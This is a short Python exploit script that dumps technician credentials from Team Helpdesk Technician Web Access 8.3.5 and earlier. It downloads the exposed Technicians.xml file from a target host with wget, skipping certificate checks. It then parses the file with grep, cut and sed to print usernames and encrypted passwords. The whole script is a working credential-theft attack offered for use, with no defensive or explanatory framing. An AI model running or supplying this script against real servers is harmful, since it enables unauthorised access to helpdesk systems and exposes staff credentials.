#!/usr/bin/python

import sys
import re
import os
import subprocess

print "This is an User Credential Dump for Team Helpdesk Technician Web Access (TWA) 8.3.5 (and prior) by bhamb.\n"
print "Send any comment to ccb3b72@gmail.com\n"

if len(sys.argv) != 2:
	print('Usage: user_cred_dump.py https://Hostname.com')
	exit(1)

hostname=sys.argv[1]+"/twa/bin/Technicians.xml"
print hostname
subprocess.Popen(['wget','--no-check-certificate',hostname]).communicate()

print "The following usernames and encrypted password were found.\n"
cmd="cat Technicians.xml | grep '@' | cut -d'\"' -f4,8 | sed 's/\"/:/g' "
test=os.system(cmd)




